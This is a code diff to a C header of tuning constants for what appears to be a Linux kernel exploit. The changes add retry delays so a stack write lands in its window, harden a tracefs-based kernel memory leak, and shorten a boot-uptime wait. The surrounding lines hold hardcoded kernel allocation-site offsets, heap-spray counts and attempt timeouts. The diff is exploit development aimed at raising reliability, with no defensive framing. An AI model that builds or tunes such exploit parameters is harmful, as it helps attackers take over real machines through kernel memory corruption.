@@ -20,7 +20,11 @@
 #define APP_QUIET_RECLAIM_WINDOW 1
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
-#define APP_ACCEPT_SCHED_TRIGGER 1
+/* A sched trigger alone does not prove the stack write reached its window. */
+#define APP_ACCEPT_SCHED_TRIGGER 0
+/* Retry each P0 slot until the stack writer reaches a verified write window. */
+#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
+  20000, 25000, 30000, 40000, 50000, 60000, 70000, 80000
 #define APP_PSELECT_POST_GUARD_AGE_CHECK 1
 #define APP_EXACT_PIPE_BUFFER_ONLY 1
 /* do_timer_create's kmem_cache_alloc call site, from the CZIF Image. */
@@ -32,6 +36,7 @@
 #define APP_TRACEFS_SLIDE_ASSIST_P0 1
 /* dup_mm's mm_cache allocation, from the CZIF Image. */
 #define APP_TRACEFS_MM_LEAK 1
+#define APP_TRACEFS_MM_NO_KSNITCH_FALLBACK 1
 #define SLIDE_TRACEFS_MM_OBJECT 0x400ULL
 #define SLIDE_TRACEFS_MM_SITE_OFF 0x001cd3acULL
 #define SLIDE_TRACEFS_MM_CAPTURE_KB 4096
@@ -105,7 +110,7 @@
 #define SLIDE_GUARD_PSELECT_SYSCALL 1
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
 #define DEFAULT_EXPLOIT_ATTEMPTS 1
-#define APP_MIN_BOOT_UPTIME_SEC 600
+#define APP_MIN_BOOT_UPTIME_SEC 300
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
